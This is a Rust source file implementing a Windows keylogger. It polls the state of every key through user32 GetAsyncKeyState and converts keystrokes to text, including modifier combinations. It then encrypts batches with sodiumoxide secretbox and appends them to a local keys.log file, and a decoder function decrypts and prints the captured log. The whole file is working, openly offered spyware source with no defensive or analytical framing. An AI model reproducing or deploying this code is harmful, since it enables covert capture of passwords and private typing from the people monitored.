//extern crate winapi;
extern crate user32;
extern crate sodiumoxide;

mod win_key_codes;

use win_key_codes::*;
use sodiumoxide::crypto::secretbox;

use std::io::Write;
use std::collections::HashMap;


fn main() {
    sodiumoxide::init();
    decoder("./keys.log".to_string(), "./encryption_key.char".to_string());
    let mut to_write_queue = String::new();

    let mut key_downed: HashMap<u8, bool> = HashMap::new();
    loop {
        std::thread::sleep(std::time::Duration::from_millis(10));
        for i in 8..255u8 {
            let is_current_key_down: bool;
            let capslock_on: bool;
            unsafe {
                is_current_key_down = user32::GetAsyncKeyState(i as i32) & (1 << 15) != 0;
                capslock_on = user32::GetKeyState(VK_CAPITAL as i32) & 1 != 0
            }
            if is_current_key_down {
                key_downed.insert(i, true);
            } else if *key_downed.get(&i).unwrap_or(&false) {
                key_downed.insert(i, false);

                let shift_status = key_downed.get(&VK_SHIFT).unwrap_or(&false);
                let ctrl_status = key_downed.get(&VK_CONTROL).unwrap_or(&false);
                let alt_status = key_downed.get(&VK_MENU).unwrap_or(&false);

                let mut current_str = match i {
                    0x30 ... 0x5A | VK_SPACE => {
                        let mut current_char = (i as char).to_string();
                        if !(*shift_status ^ capslock_on) {
                            current_char = current_char.to_lowercase();
                        }
                        current_char
                    }
                    VK_BACK => "[Backspace]".to_string(),
                    VK_TAB => "[Tab]".to_string(),
                    VK_OEM_2 => "/".to_string(),
                    VK_ESCAPE => "[Esc]".to_string(),
                    VK_RETURN => "\n".to_string(),
                    0xA0 ... 0xA5 | VK_SHIFT | VK_MENU | VK_CONTROL => "".to_string(),
                    _ => { "[Not Impl]".to_string() }
                };

                if *ctrl_status | *alt_status {
                    current_str = format!("[{}{}{}{}]",
                                          if *ctrl_status { "Ctrl + " } else { "" },
                                          if *shift_status { "Shift + " } else { "" },
                                          if *alt_status { "Alt + " } else { "" },
                                          current_str.to_uppercase());
                    current_str += "\n";
                }
                save_string_to_queue(&current_str, &mut to_write_queue)
            }
        }
    }
}

fn save_string_to_queue(to_write: &String, string_queue: &mut String) {
    if to_write.is_empty() { return; }
    string_queue.push_str(to_write);

    if string_queue.len() < 100 { return; }
    let string_queue_owned = pad(string_queue, 144, '-',true);

    string_queue.clear();

    let (key, nonce) = generate_key_and_nonce();

    let encrypted = secretbox::seal(string_queue_owned.as_bytes(), &nonce, &key);

    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open("./keys.log").expect("Failed to open file");

    file.write([&nonce[..], encrypted.as_ref()].concat().as_ref()).expect("Can't write to file");
}

fn pad(original: &String, width: usize, pad_char: char,truncate: bool) -> String {

    if width <= original.len() { if truncate { return original[..width].to_string(); } else { return original.to_string(); } }
    let diff = width - original.len();
    let mut s = original.clone();
    for _ in 0..diff { s.push(pad_char) }
    s
}

fn generate_key_and_nonce() -> (secretbox::Key, secretbox::Nonce) {
    const KEY_LOC: &str = "./encryption_key.char";
    if let Ok(mut file) = std::fs::File::open(KEY_LOC) {
        use std::io::Read;
        let mut contents = Vec::new();
        file.read_to_end(&mut contents).expect("File read error");

        let key = secretbox::Key::from_slice(&contents[..]).expect("Key slice not the correct size");
        let nonce = secretbox::gen_nonce();

        return (key, nonce);
    } else {
        let mut file = std::fs::File::create(KEY_LOC).expect("Can't create file");

        let key = secretbox::gen_key();
        let nonce = secretbox::gen_nonce();

        file.write(&key[..]).expect("Writing key failed");

        return (key, nonce);
    }
}

fn decoder(log_file_path: String, key_file_path: String) {
    use std::io::Read;
    use std::io::BufRead;
    let key = {
        let mut contents = Vec::new();
        std::fs::File::open(key_file_path).expect("Key file not found").read_to_end(&mut contents).expect("File read error");
        secretbox::Key::from_slice(&contents[..(secretbox::KEYBYTES)]).expect("Key slice not the correct size")
    };

    let mut file = std::io::BufReader::with_capacity(160 + secretbox::NONCEBYTES, std::fs::File::open(&log_file_path).expect("Log file not found"));

    loop {
        let buffer_length = {
            let data = file.fill_buf().expect("Read buffer failed");
            if data.len() == 0 { break; }

            let nonce = secretbox::Nonce::from_slice(&data[..secretbox::NONCEBYTES]).expect("Nonce parse fail");
            let answer = secretbox::open(&data[secretbox::NONCEBYTES..], &nonce, &key).expect("Decrypt fail");
            let answer = String::from_utf8(answer).expect("Utf8 parse problem");
            println!("{}", answer);
            data.len()
        };
        file.consume(buffer_length);
    }
}

fn print_in_hex(input: &Vec<u8>) {
    let mut s = String::new();
    for byte in input {
        s.push_str(&format!("{:X} ", &byte));
    }
    println!("{}", s);
}